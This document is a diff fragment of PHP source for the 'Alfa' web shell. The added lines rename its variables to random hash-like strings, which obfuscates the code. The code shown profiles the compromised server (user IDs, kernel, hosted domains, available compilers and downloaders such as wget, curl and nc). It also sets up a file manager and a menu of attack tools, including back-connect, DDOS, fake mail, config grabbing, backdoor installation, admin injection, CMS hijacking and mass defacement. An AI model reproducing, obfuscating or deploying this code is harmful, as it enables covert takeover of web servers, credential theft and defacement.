+$uwdmfmmt9871d3a2c554b27151cacf1422eec048 = function_exists("getmyuid")?@getmyuid():"????";
+$zqjevpbn2d53a8fb7abf5be7f4a3cf4b565cc75c = function_exists("getmygid")?@getmygid():"????";
+$btxspfltdb0f6f37ebeb6ea09489124345af2a45 = "?";
 }else{
-$uid = function_exists("posix_getpwuid")&&function_exists("posix_geteuid")?@posix_getpwuid(posix_geteuid()):array("name"=>"????", "uid"=>"????");
-$gid = function_exists("posix_getgrgid")&&function_exists("posix_getegid")?@posix_getgrgid(posix_getegid()):array("name"=>"????", "gid"=>"????");
-$user = $uid['name'];
-$uid = $uid['uid'];
-$group = $gid['name'];
-$gid = $gid['gid'];
+$uwdmfmmt9871d3a2c554b27151cacf1422eec048 = function_exists("posix_getpwuid")&&function_exists("posix_geteuid")?@posix_getpwuid(posix_geteuid()):array("name"=>"????", "uid"=>"????");
+$zqjevpbn2d53a8fb7abf5be7f4a3cf4b565cc75c = function_exists("posix_getgrgid")&&function_exists("posix_getegid")?@posix_getgrgid(posix_getegid()):array("name"=>"????", "gid"=>"????");
+$eeodyzriee11cbb19052e40b07aac0ca060c23ee = $uwdmfmmt9871d3a2c554b27151cacf1422eec048['name'];
+$uwdmfmmt9871d3a2c554b27151cacf1422eec048 = $uwdmfmmt9871d3a2c554b27151cacf1422eec048['uid'];
+$btxspfltdb0f6f37ebeb6ea09489124345af2a45 = $zqjevpbn2d53a8fb7abf5be7f4a3cf4b565cc75c['name'];
+$zqjevpbn2d53a8fb7abf5be7f4a3cf4b565cc75c = $zqjevpbn2d53a8fb7abf5be7f4a3cf4b565cc75c['gid'];
 }
-$cwd_links = '';
-$path = explode("/", $GLOBALS['cwd']);
-$n=count($path);
-for($i=0; $i<$n-1; $i++) {
-$cwd_links .= "<a class='header_pwd' onclick='g(\"FilesMan\",\"";
-$cach_cwd_path = "";
-for($j=0; $j<=$i; $j++){
-$cwd_links .= $path[$j].'/';
-$cach_cwd_path .= $path[$j].'/';
+$eimuvpaae95018b624f00c5735c8baacde05f940 = '';
+$jwzcflrpd6fe1d0be6347b8ef2427fa629c04485 = explode("/", $GLOBALS['cwd']);
+$qhdvbdap7b8b965ad4bca0e41ab51de7b31363a1=count($jwzcflrpd6fe1d0be6347b8ef2427fa629c04485);
+for($brcjlegv865c0c0b4ab0e063e5caa3387c1a8741=0; $brcjlegv865c0c0b4ab0e063e5caa3387c1a8741<$qhdvbdap7b8b965ad4bca0e41ab51de7b31363a1-1; $brcjlegv865c0c0b4ab0e063e5caa3387c1a8741++) {
+$eimuvpaae95018b624f00c5735c8baacde05f940 .= "<a class='header_pwd' onclick='g(\"FilesMan\",\"";
+$fyhgtfyjb2f07bf8576cc7ca7aa908c21721386b = "";
+for($zvhlbqna363b122c528f54df4a0446b6bab05515=0; $zvhlbqna363b122c528f54df4a0446b6bab05515<=$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741; $zvhlbqna363b122c528f54df4a0446b6bab05515++){
+$eimuvpaae95018b624f00c5735c8baacde05f940 .= $jwzcflrpd6fe1d0be6347b8ef2427fa629c04485[$zvhlbqna363b122c528f54df4a0446b6bab05515].'/';
+$fyhgtfyjb2f07bf8576cc7ca7aa908c21721386b .= $jwzcflrpd6fe1d0be6347b8ef2427fa629c04485[$zvhlbqna363b122c528f54df4a0446b6bab05515].'/';
 }
-$cwd_links .= "\")' path='".$cach_cwd_path."' href='#action=fileman&path=".$cach_cwd_path."'>".$path[$i]."/</a>";
+$eimuvpaae95018b624f00c5735c8baacde05f940 .= "\")' path='".$fyhgtfyjb2f07bf8576cc7ca7aa908c21721386b."' href='#action=fileman&path=".$fyhgtfyjb2f07bf8576cc7ca7aa908c21721386b."'>".$jwzcflrpd6fe1d0be6347b8ef2427fa629c04485[$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741]."/</a>";
 }
-$drives = "";
-foreach(range('a','z') as $drive)
-if(@is_dir($drive.':\\'))
-$drives .= '<a href="javascript:void(0);" class="header_drive" onclick="g(\'FilesMan\',\''.$drive.':/\')">[ '.$drive.' ]</a> ';
-$csscode ='	-moz-animation-name: spin;-moz-animation-iteration-count: infinite;-moz-animation-timing-function: linear;-moz-animation-duration: 1s;-webkit-animation-name: spin;-webkit-animation-iteration-count: infinite;-webkit-animation-timing-function: linear;-webkit-animation-duration: 1s;-ms-animation-name: spin;-ms-animation-iteration-count: infinite;-ms-animation-timing-function: linear;-ms-animation-duration: 1s;animation-name: spin;animation-iteration-count: infinite;animation-timing-function: linear;animation-duration: 1s;';
+$ykqnkwvw2b764bafdbf32ae530608c3ff8b2fd3b = "";
+foreach(range('a','z') as $wycalxbf4aa1e7414849577e6d4c076c08782d3a)
+if(@is_dir($wycalxbf4aa1e7414849577e6d4c076c08782d3a.':\\'))
+$ykqnkwvw2b764bafdbf32ae530608c3ff8b2fd3b .= '<a href="javascript:void(0);" class="header_drive" onclick="g(\'FilesMan\',\''.$wycalxbf4aa1e7414849577e6d4c076c08782d3a.':/\')">[ '.$wycalxbf4aa1e7414849577e6d4c076c08782d3a.' ]</a> ';
+$znvaonll8c039c80621a8d6636f1b6d0998e4e3d ='	-moz-animation-name: spin;-moz-animation-iteration-count: infinite;-moz-animation-timing-function: linear;-moz-animation-duration: 1s;-webkit-animation-name: spin;-webkit-animation-iteration-count: infinite;-webkit-animation-timing-function: linear;-webkit-animation-duration: 1s;-ms-animation-name: spin;-ms-animation-iteration-count: infinite;-ms-animation-timing-function: linear;-ms-animation-duration: 1s;animation-name: spin;animation-iteration-count: infinite;animation-timing-function: linear;animation-duration: 1s;';
 echo '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
 <html xmlns="http://www.w3.org/1999/xhtml">
 <head>
@@ -1064,8 +1138,8 @@ echo '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www
 @-webkit-keyframes spin {from {-webkit-transform: rotate(0deg);}to {-webkit-transform: rotate(360deg);}}
 @-moz-keyframes spin {from {-moz-transform: rotate(0deg);}to {-moz-transform: rotate(360deg);}}
 @-ms-keyframes spin {from {-ms-transform: rotate(0deg);}to {-ms-transform: rotate(360deg);}}
-#alfaloader{'.$csscode.'width:100px;height:100px;}
-#a_loader img{'.$csscode.'width:150px;height:150px;position:fixed;z-index:999999;top: 31%;left: 45%;}
+#alfaloader{'.$znvaonll8c039c80621a8d6636f1b6d0998e4e3d.'width:100px;height:100px;}
+#a_loader img{'.$znvaonll8c039c80621a8d6636f1b6d0998e4e3d.'width:150px;height:150px;position:fixed;z-index:999999;top: 31%;left: 45%;}
 .ajaxarea{display:none;border:1px solid #0E304A;color:#67ABDF}.up_bar{margin-bottom: 2px;transition:width 2s;background-color:red;width:0;height:8px;display:none;}#hidden_sh{background-color:#0E304A;text-align:center;position:absolute;right:0;left:90%;border-bottom-left-radius:2em}.alert_green{color:#0F0;font-family:"Comic Sans MS";font-size:small;text-decoration:none}.whole{background-color:#000;background-image:url(http://solevisible.com/images/alfabg.png);background-position:center;background-attachment:fixed;background-repeat:no-repeat}.header{height:auto;width:auto;border:7px solid #0E304A;color:'.alfa_getColor("header_values").';font-size:12px;font-family:Verdana,Geneva,sans-serif}.header a{text-decoration:none;}.filestools a{color:#0F0;text-decoration:none}.filestools a:hover{color:#FFF;text-decoration:none;}span{font-weight:bolder;color:#FFF}.txtfont{font-family:"Comic Sans MS";font-size:small;color:#fff;display:inline-block}.txtfont_header{font-family:"Comic Sans MS";font-size:large;display:inline-block;color:#59cc33}.tbltxt{font-family:"Comic Sans MS";color:#fff;font-size:small;display:inline-block}input[type="file"]{display:none}.inputfile{border:1px solid #0E304A;background:transparent;box-shadow:0 0 4px #0E304A;border-radius:4px;height:20px;width:250px;text-overflow:ellipsis;white-space:nowrap;cursor:pointer;display:inline-block;overflow:hidden}.inputfile:hover{box-shadow:0 0 4px #27979B;border:1px solid #27979B;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-webkit-box-shadow:rgba(0,119,0) 0 0 4px;-moz-box-shadow:rgba(0,119,0) 0 0 4px}.inputfile span,.inputfile strong{padding:2px;padding-left:10px}.inputfile span{color:#25ff00;width:90px;min-height:2em;display:inline-block;text-overflow:ellipsis;white-space:nowrap;overflow:hidden;vertical-align:top;float:left}.inputfile strong{background-image:url('.__showicon('alfamini').');background-repeat:no-repeat;background-position:float;height:100%;width:109px;color:#fff;background-color:#0E304A;display:inline-block;float:right}.inputfile:focus strong,.inputfile.has-focus strong,.inputfile:hover strong{background-color:#46647A}.button{padding:3px}#addup,.button{outline:none;cursor:pointer;border:1px solid #0E304A;background:transparent;box-shadow:0 0 4px #0E304A;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:100px;-webkit-box-shadow:#555 0 0 4px;-moz-box-shadow:#555 0 0 4px;background-color:#000;color:green;border-radius:100px}#addup:hover,.button:hover{box-shadow:0 0 4px #27979B;border:1px solid #27979B;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:100px;-webkit-box-shadow:rgba(0,119,0) 0 0 4px;-moz-box-shadow:rgba(0,119,0) 0 0 4px}input[type=text]:disabled:hover{cursor:not-allowed}td{padding:'.($GLOBALS['DB_NAME']['show_icons']=='1'?'0':'1').'px}.myCheckbox{padding-left:2px}.myCheckbox label{display:inline-block;cursor:pointer;position:relative}.myCheckbox input[type=checkbox]{display:none}.myCheckbox label:before{content:"";display:inline-block;width:14px;height:13px;position:absolute;background-color:#aaa;box-shadow:inset 0 2px 3px 0 rgba(0,0,0,.3),0 1px 0 0 rgba(255,255,255,.8)}.myCheckbox label{margin-bottom:15px;padding-right:17px}.myCheckbox label:before{border-radius:100px}input[type=checkbox]:checked + label:before{content:"";background-color:#0E304A;background-image:url('.__showicon('alfamini').');background-repeat:no-repeat;background-position:50% 50%;background-size:14px 14px;box-shadow:0 0 4px #0F0}#meunlist{font-family:Verdana,Geneva,sans-serif;color:#FFF;width:auto;border-right-width:7px;border-left-width:7px;height:auto;font-size:12px;font-weight:700;border-top-width:0;border-color:#0E304A;border-style:solid}.whole #meunlist ul{text-align:center;list-style-type:none;margin:0;padding:5px 5px 7px 2px}.whole #meunlist li{margin:0;padding:0;display:inline}.whole #meunlist a{font-family:arial,sans-serif;font-size:14px;text-decoration:none;font-weight:700;clear:both;width:100px;margin-right:-6px;border-right-width:1px;border-right-style:solid;border-right-color:#FFF;padding:3px 15px}.foot{font-family:Verdana,Geneva,sans-serif;margin:0;padding:0;width:100%;text-align:center;font-size:12px;color:#0E304A;border-right-width:7px;border-left-width:7px;border-bottom-width:7px;border-bottom-style:solid;border-right-style:solid;border-right-style:solid;border-left-style:solid;border-color:#0E304A}#text{text-align:center}input[type=submit]{cursor:pointer;background-image:url('.__showicon('btn').');background-repeat:no-repeat;background-position:50% 50%;background-size:23px 23px;background-color:#000;width:30px;height:30px;border:1px solid #27979B;border-radius:100px}textarea{padding:3px;color:#999;text-shadow:#777 0 0 3px;border:1px solid #0E304A;background:transparent;box-shadow:0 0 4px #0E304A;padding:3px;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-webkit-box-shadow:#555 0 0 4px;-moz-box-shadow:#555 0 0 4px}textarea:hover{color:#FFF;text-shadow:#060 0 0 6px;box-shadow:0 0 4px #27979B;border:1px solid #27979B;padding:3px;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-webkit-box-shadow:rgba(0,119,0) 0 0 4px;-moz-box-shadow:rgba(0,119,0) 0 0 4px}input[type=text],input[type=number],.alfa_custom_cmd_btn{padding:3px;color:#999;text-shadow:#777 0 0 3px;border:1px solid #0E304A;background:transparent;box-shadow:0 0 4px #0E304A;padding:3px;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-webkit-box-shadow:#555 0 0 4px;-moz-box-shadow:#555 0 0 4px}input[type=submit]:hover{color:#000;text-shadow:#060 0 0 6px;box-shadow:0 0 4px #27979B;border:2px solid #27979B;-moz-border-radius:4px;border-radius:100px;-webkit-box-shadow:rgba(0,119,0) 0 0 4px;-moz-box-shadow:rgba(0,119,0) 0 0 4px}input[type=text]:hover{color:#FFF;text-shadow:#060 0 0 6px;box-shadow:0 0 4px #27979B;border:1px solid #27979B;padding:3px;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-webkit-box-shadow:rgba(0,119,0) 0 0 4px;-moz-box-shadow:rgba(0,119,0) 0 0 4px}select{padding:3px;width:162px;color:#FFE;text-shadow:#000 0 2px 7px;border:1px solid #0E304A;background:#000;text-decoration:none;box-shadow:0 0 4px #0E304A;padding:3px;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-webkit-box-shadow:#555 0 0 4px;-moz-box-shadow:#555 0 0 4px}select:hover{border:1px solid #27979B;box-shadow:0 0 4px #27979B;padding:3px;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-webkit-box-shadow:rgba(0,119,0) 0 0 4px;-moz-box-shadow:rgba(0,119,0) 0 0 4px}
 .foottable{width: 300px;font-weight: bold;'.(!@is_writable($GLOBALS['cwd'])?'}.dir{background-color:red;}':'}').'.main th{text-align:left;}.main a{color: #FFF;}.main tr:hover{background-color:#646464 !important;}.ml1{ border:1px solid #0E304A;padding:5px;margin:0;overflow: auto; }.bigarea{ width:99%; height:300px; }.alfa_custom_cmd_btn {padding: 5px;color: #24ff03;cursor: pointer;}.ajaxarea.filesman-active-content {display: block;}'.alfaCssLoadColors().'
 </style>';
@@ -1084,9 +1158,9 @@ var alfa1_="",alfa2_="",alfa3_="",alfa4_="",alfa5_="",alfa6_="",alfa7_="",alfa8_
 </form>
 <input type='file' style='display:none;' id='importFileBtn' onchange='importConfig(event);'>
 <div id='a_loader'><img src='".__showicon('loader')."'></div>";
-$cmd_uname = alfaEx("uname -a",false,false);
-$uname = function_exists('php_uname') ? substr(@php_uname(), 0, 120) : (strlen($cmd_uname)>0?$cmd_uname:'( php_uname ) Function Disabled !');
-if($uname=="( php_uname ) Function Disabled !"){$GLOBALS["need_to_update_header"]="true";}
+$onxerlrl397019bb489bdc576b45a3c04a24f7b8 = alfaEx("uname -a",false,false);
+$ogfegecc4040592cec1880aa70936989f05e7c31 = function_exists('php_uname') ? substr(@php_uname(), 0, 120) : (strlen($onxerlrl397019bb489bdc576b45a3c04a24f7b8)>0?$onxerlrl397019bb489bdc576b45a3c04a24f7b8:'( php_uname ) Function Disabled !');
+if($ogfegecc4040592cec1880aa70936989f05e7c31=="( php_uname ) Function Disabled !"){$GLOBALS["need_to_update_header"]="true";}
 echo '
 </head>
 <body bgcolor="#000000" leftmargin="0" topmargin="0" marginwidth="0" marginheight="0">
@@ -1095,8 +1169,8 @@ echo '
 <form method="post" name="mf" style="display:none;">
 <input type="hidden" name="a">
 <input type="hidden" name="c" value="'.$GLOBALS['cwd'].'">';
-for($s=1;$s<=10;$s++){
-echo '<input type="hidden" name="alfa'.$s.'">';
+for($fwekvgvg03c7c0ace395d80182db07ae2c30f034=1;$fwekvgvg03c7c0ace395d80182db07ae2c30f034<=10;$fwekvgvg03c7c0ace395d80182db07ae2c30f034++){
+echo '<input type="hidden" name="alfa'.$fwekvgvg03c7c0ace395d80182db07ae2c30f034.'">';
 }
 echo '<input type="hidden" name="charset">
 </form>
@@ -1104,16 +1178,16 @@ echo '<input type="hidden" name="charset">
 <div class="header"><table width="100%" border="0">
 <tr>
 <td width="3%"><span class="header_vars">Uname:</span></td>
-<td colspan="2"><span class="header_values" id="header_uname">'.$uname.'</span></td>
+<td colspan="2"><span class="header_values" id="header_uname">'.$ogfegecc4040592cec1880aa70936989f05e7c31.'</span></td>
 </tr>
 <tr>
 <td><span class="header_vars">User:</span></td>
-<td><span class="header_values" id="header_userid">'. $uid . ' [ ' . $user . ' ] </span><span class="header_vars"> Group: </span><span class="header_values" id="header_groupid">' . $gid . ' [ ' . $group . ' ]</span> </td>
+<td><span class="header_values" id="header_userid">'. $uwdmfmmt9871d3a2c554b27151cacf1422eec048 . ' [ ' . $eeodyzriee11cbb19052e40b07aac0ca060c23ee . ' ] </span><span class="header_vars"> Group: </span><span class="header_values" id="header_groupid">' . $zqjevpbn2d53a8fb7abf5be7f4a3cf4b565cc75c . ' [ ' . $btxspfltdb0f6f37ebeb6ea09489124345af2a45 . ' ]</span> </td>
 <td width="12%" rowspan="8"><img style="border-radius:100px;" width="300" height="170" alt="alfa team 2012" draggable="false" src="http://solevisible.com/images/alfa-iran.png" /></td>
 </tr>
 <tr>
 <td><span class="header_vars">PHP:</span></td>
-<td><b>'.@phpversion(). ' </b><span class="header_vars"> Safe Mode: '.$safe_modes.'</span></td>
+<td><b>'.@phpversion(). ' </b><span class="header_vars"> Safe Mode: '.$dcwnlocgd27c87d911f030008cce9ab55024113f.'</span></td>
 </tr>
 <tr>
 <td><span class="header_vars">ServerIP:</span></td>
@@ -1127,48 +1201,48 @@ echo '<input type="hidden" name="charset">
 <td><span class="header_vars">Domains:</span></td>
 <td width="76%"><span class="header_values" id="header_domains">';
 if($GLOBALS['sys']=='unix'){
-$d0mains = _alfa_file("/etc/named.conf",false);
-if(!$d0mains){echo "Cant Read [ /etc/named.conf ]";$GLOBALS["need_to_update_header"]="true";}else{
-$count=0;
-foreach($d0mains as $d0main){
-if(@strstr($d0main,"zone")){
-preg_match_all('#zone "(.*)"#', $d0main, $domains);
+$tdhaoszb1b121fb6052882fa105bb281448bcad3 = _alfa_file("/etc/named.conf",false);
+if(!$tdhaoszb1b121fb6052882fa105bb281448bcad3){echo "Cant Read [ /etc/named.conf ]";$GLOBALS["need_to_update_header"]="true";}else{
+$gstvxiofe2942a04780e223b215eb8b663cf5353=0;
+foreach($tdhaoszb1b121fb6052882fa105bb281448bcad3 as $jgnscnwr19d85686df493bb25f5a6bfe5c0a7753){
+if(@strstr($jgnscnwr19d85686df493bb25f5a6bfe5c0a7753,"zone")){
+preg_match_all('#zone "(.*)"#', $jgnscnwr19d85686df493bb25f5a6bfe5c0a7753, $jwhtlluxe4e46deb7f9cc58c7abfb32e5570b6f3);
 flush();
-if(strlen(trim($domains[1][0])) > 2){
+if(strlen(trim($jwhtlluxe4e46deb7f9cc58c7abfb32e5570b6f3[1][0])) > 2){
 flush();
-$count++;}}}
-echo "$count Domains";}}
+$gstvxiofe2942a04780e223b215eb8b663cf5353++;}}}
+echo "$gstvxiofe2942a04780e223b215eb8b663cf5353 Domains";}}
 else{echo("Cant Read [ /etc/named.conf ]");}
 echo '</span></td>
 </tr>
 <tr>
 <td height="16"><span class="header_vars">HDD:</span></td>
-<td><span class="header_vars">Total:</span><b>'.alfaSize($totalSpace).' </b><span class="header_vars">Free:</span><b>' . alfaSize($freeSpace) . ' ['. (int) ($freeSpace/$totalSpace*100) . '%]</b></td>
+<td><span class="header_vars">Total:</span><b>'.alfaSize($irtldmrodb28f3b2aefa09d63dcd57583254de71).' </b><span class="header_vars">Free:</span><b>' . alfaSize($umbdwmvqa9cc6a00f8695708b1579c7988207667) . ' ['. (int) ($umbdwmvqa9cc6a00f8695708b1579c7988207667/$irtldmrodb28f3b2aefa09d63dcd57583254de71*100) . '%]</b></td>
 </tr>';
 if($GLOBALS['sys']=='unix'){
-$useful_downloader = '<tr><td height="18" colspan="2"><span class="header_vars">useful:</span><span class="header_values" id="header_useful">--------------</span></td></tr><td height="0" colspan="2"><span class="header_vars">Downloader: </span><span class="header_values" id="header_downloader">--------------</span></td></tr>';
+$yplxtorjb6c14dd0a35c2677b0f8641f7f50222a = '<tr><td height="18" colspan="2"><span class="header_vars">useful:</span><span class="header_values" id="header_useful">--------------</span></td></tr><td height="0" colspan="2"><span class="header_vars">Downloader: </span><span class="header_values" id="header_downloader">--------------</span></td></tr>';
 if(!@ini_get('safe_mode')){
 if(strlen(alfaEx("id",false,false))>0){
 echo '<tr><td height="18" colspan="2"><span class="header_vars">Useful : </span>';
-$userful = array('gcc','lcc','cc','ld','make','php','perl','python','ruby','tar','gzip','bzip','bzialfa2','nc','locate','suidperl');
-$x=0;
-foreach($userful as $item)if(alfaWhich($item)){$x++;echo '<span class="header_values" style="margin-left: 4px;">'.$item.'</span>';}
-if($x==0){echo "<span class='header_values' id='header_useful'>--------------</span>";$GLOBALS["need_to_update_header"] = "true";}
+$aqkytwxj36c64de6d092aeae260585e2059c6c64 = array('gcc','lcc','cc','ld','make','php','perl','python','ruby','tar','gzip','bzip','bzialfa2','nc','locate','suidperl');
+$fyyftmba9dd4e461268c8034f5c8564e155c67a6=0;
+foreach($aqkytwxj36c64de6d092aeae260585e2059c6c64 as $geklwdir447b7147e84be512208dcc0995d67ebc)if(alfaWhich($geklwdir447b7147e84be512208dcc0995d67ebc)){$fyyftmba9dd4e461268c8034f5c8564e155c67a6++;echo '<span class="header_values" style="margin-left: 4px;">'.$geklwdir447b7147e84be512208dcc0995d67ebc.'</span>';}
+if($fyyftmba9dd4e461268c8034f5c8564e155c67a6==0){echo "<span class='header_values' id='header_useful'>--------------</span>";$GLOBALS["need_to_update_header"] = "true";}
 echo '</td>
 </tr>
 <tr>
 <td height="0" colspan="2"><span class="header_vars">Downloader: </span>';
-$downloaders = array('wget','fetch','lynx','links','curl','get','lwp-mirror');
-$x=0;
-foreach($downloaders as $item2)if(alfaWhich($item2)){$x++;echo '<span class="header_values" style="margin-left: 4px;">'.$item2.'</span>';}
-if($x==0){echo "<span class='header_values' id='header_downloader'>--------------</span>";$GLOBALS["need_to_update_header"] = "true";}
+$vnvukupa1945d1530aa4d81dc5676da670c6d09b = array('wget','fetch','lynx','links','curl','get','lwp-mirror');
+$fyyftmba9dd4e461268c8034f5c8564e155c67a6=0;
+foreach($vnvukupa1945d1530aa4d81dc5676da670c6d09b as $cnlwvqoa235bacd9fe81ea549903a51e673bdbb9)if(alfaWhich($cnlwvqoa235bacd9fe81ea549903a51e673bdbb9)){$fyyftmba9dd4e461268c8034f5c8564e155c67a6++;echo '<span class="header_values" style="margin-left: 4px;">'.$cnlwvqoa235bacd9fe81ea549903a51e673bdbb9.'</span>';}
+if($fyyftmba9dd4e461268c8034f5c8564e155c67a6==0){echo "<span class='header_values' id='header_downloader'>--------------</span>";$GLOBALS["need_to_update_header"] = "true";}
 echo '</td>
 </tr>';
 }else{
-echo $useful_downloader;$GLOBALS["need_to_update_header"] = "true";
+echo $yplxtorjb6c14dd0a35c2677b0f8641f7f50222a;$GLOBALS["need_to_update_header"] = "true";
 }
 }else{
-echo $useful_downloader;$GLOBALS["need_to_update_header"] = "true";
+echo $yplxtorjb6c14dd0a35c2677b0f8641f7f50222a;$GLOBALS["need_to_update_header"] = "true";
 }
 }else{
 echo '<tr><td height="18" colspan="2"><span class="header_vars">Windows:</span><b>';
@@ -1178,15 +1252,15 @@ echo '</td>
 <td height="0" colspan="2"><span class="header_vars">Downloader: </span><b>-------------</b></td>
 </tr></b>';
 }
-$quotes = (function_exists('get_magic_quotes_gpc')?get_magic_quotes_gpc():'0');if ($quotes == "1" or $quotes == "on"){$magic = '<b><span class="header_on">ON</span>';}else{$magic = '<span class="header_off">OFF</span>';}
+$cxqmltus2150fd65034a9bcdb357943b3900a918 = (function_exists('get_magic_quotes_gpc')?get_magic_quotes_gpc():'0');if ($cxqmltus2150fd65034a9bcdb357943b3900a918 == "1" or $cxqmltus2150fd65034a9bcdb357943b3900a918 == "on"){$ymwafhdw2f3a4fccca6406e35bcf33e92dd93135 = '<b><span class="header_on">ON</span>';}else{$ymwafhdw2f3a4fccca6406e35bcf33e92dd93135 = '<span class="header_off">OFF</span>';}
 echo '<tr>
 <td height="16" colspan="2"><span class="header_vars">Disable Functions: </span><b>'.Alfa_GetDisable_Function().'</b></td>
 </tr>
 <tr>
-<td height="16" colspan="2"><span class="header_vars">CURL :</span>'.$curl.' | <span class="header_vars">SSH2 : </span>'.$ssh2.' | <span class="header_vars">Magic Quotes : </span>'.$magic.' | <span class="header_vars"> MySQL :</span>'.$mysql.' | <span class="header_vars">MSSQL :</span>'.$mssql.' | <span class="header_vars"> PostgreSQL :</span>'.$pg.' | <span class="header_vars"> Oracle :</span>'.$or.' '.($GLOBALS['sys']=="unix"?'| <span class="header_vars"> CGI :</span> '.$cgi_shell:"").'</td><td width="15%"><div id="alfa_solevisible"><center><a href="https://t.me/solevisible" target="_blank"><span><font class="solevisible-text" color="#0F0">Sole Sad & Invisible</font></span></a></center></div></td>
+<td height="16" colspan="2"><span class="header_vars">CURL :</span>'.$qqhrnrcwf6e57c9de709e45feb0d955351f53548.' | <span class="header_vars">SSH2 : </span>'.$njiaostw1eb174fa332c502d2b4929d74e5d1d64.' | <span class="header_vars">Magic Quotes : </span>'.$ymwafhdw2f3a4fccca6406e35bcf33e92dd93135.' | <span class="header_vars"> MySQL :</span>'.$uadvcujo81c3b080dad537de7e10e0987a4bf52e.' | <span class="header_vars">MSSQL :</span>'.$dffrmfjea0589ddd20d56ac0fd4c8f1c83177672.' | <span class="header_vars"> PostgreSQL :</span>'.$viobjnle235ec52392b77977539cf78b62e708d3.' | <span class="header_vars"> Oracle :</span>'.$okougdode81c4e4f2b7b93b481e13a8553c2ae1b.' '.($GLOBALS['sys']=="unix"?'| <span class="header_vars"> CGI :</span> '.$yowbntez96b22492d937bc3ace31d0abe38ba66d:"").'</td><td width="15%"><div id="alfa_solevisible"><center><a href="https://t.me/solevisible" target="_blank"><span><font class="solevisible-text" color="#0F0">Sole Sad & Invisible</font></span></a></center></div></td>
 </tr>
 <tr>
-<td height="11" colspan="3"><span class="header_vars">Open_basedir :</span><b>'.$open_b.'</b> | <span class="header_vars">Safe_mode_exec_dir :</span><b>'.$safe_exe.'</b> | <span class="header_vars"> Safe_mode_include_dir :</span></b>'.$safe_include.'</b></td>
+<td height="11" colspan="3"><span class="header_vars">Open_basedir :</span><b>'.$reeyunzd5289df8a8663eeaea5de3baad848212d.'</b> | <span class="header_vars">Safe_mode_exec_dir :</span><b>'.$iajnyxqb4c128155fac3a64697dbf1e7f69fa16d.'</b> | <span class="header_vars"> Safe_mode_include_dir :</span></b>'.$kodnhifb3fc7c001fae08c7c5462a0aa84e0edc0.'</b></td>
 </tr>
 <tr>
 <td height="11"><span class="header_vars">SoftWare: </span></td>
@@ -1195,26 +1269,26 @@ echo '<tr>
 if($GLOBALS['sys']=="win"){
 echo '<tr>
 <td height="12"><span class="header_vars">DRIVE:</span></td>
-<td colspan="2"><b>'.$drives.'</b></td>
+<td colspan="2"><b>'.$ykqnkwvw2b764bafdbf32ae530608c3ff8b2fd3b.'</b></td>
 </tr>';
 }
 echo '<tr>
 <td height="12"><span class="header_vars">PWD:</span></td>
-<td colspan="2"><span id="header_cwd">'.$cwd_links.' </span><a href="#action=fileman&path='.$GLOBALS['home_cwd'].'" onclick="g(\'FilesMan\',\'' . $GLOBALS['home_cwd'] . '\',\'\',\'\',\'\')"><span class="home_shell">[ Home Shell ]</span> </a></td>
+<td colspan="2"><span id="header_cwd">'.$eimuvpaae95018b624f00c5735c8baacde05f940.' </span><a href="#action=fileman&path='.$GLOBALS['home_cwd'].'" onclick="g(\'FilesMan\',\'' . $GLOBALS['home_cwd'] . '\',\'\',\'\',\'\')"><span class="home_shell">[ Home Shell ]</span> </a></td>
 </tr>
 </table>
 </div>
 <div id="meunlist">
 <ul>
 ';
-$li = array('proc'=>'Process','phpeval'=>'Eval','sql'=>'SQL Manager','dumper'=>'Database Dumper','coldumper'=>'Column Dumper','hash'=>'En-Decoder','connect'=>'BC',
+$qjdtkkldd70c1e5d44de8a9150eb91ecff563578 = array('proc'=>'Process','phpeval'=>'Eval','sql'=>'SQL Manager','dumper'=>'Database Dumper','coldumper'=>'Column Dumper','hash'=>'En-Decoder','connect'=>'BC',
 'zoneh'=>'ZONE-H','dos'=>'DDOS','safe'=>'ByPasser','cgishell'=>'Cgi Shell','ssiShell'=>'SSI SHELL','cpcrack'=>'Hash Tools',
 'portscanner'=>'Port Scaner','basedir'=>'Open BaseDir','mail'=>'Fake Mail','ziper'=>'Compressor','deziper'=>'DeCompressor','IndexChanger'=>'Index Changer','pwchanger'=>'Add New Admin','ShellInjectors'=>'Shell Injectors',
 'php2xml'=>'PHP2XML','cloudflare'=>'CloudFlare','Whmcs'=>'Whmcs DeCoder','symlink'=>'Symlink','MassDefacer'=>'Mass Defacer','Crackers'=>'BruteForcer','searcher'=>'Searcher','config_grabber'=>'Config Grabber','fakepage'=>'Fake Page','archive_manager'=>'Archive Manager',
 'cmshijacker'=>'CMS Hijacker','remotedl'=>'Remote Upload','inbackdoor'=>'Install BackDoor','whois'=>'Whois','selfrm'=>'Remove Shell'
 );
-foreach($li as $key=>$value){
-echo('<li><a id="menu_opt_'.$key.'" href="#action=options&path='.$GLOBALS['cwd'].'&opt='.$key.'" class="menu_options" onclick="alfa_can_add_opt=true;this.href=\'#action=options&path=\'+c_+\'&opt='.$key.'\';g(\''.$key.'\',null,\'\',\'\',\'\');d.querySelector(\'.opt-title\').innerHTML=this.innerHTML;">'.$value.'</a></li>'."\n");
+foreach($qjdtkkldd70c1e5d44de8a9150eb91ecff563578 as $ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d=>$rkptsoeg2063c1608d6e0baf80249c42e2be5804){
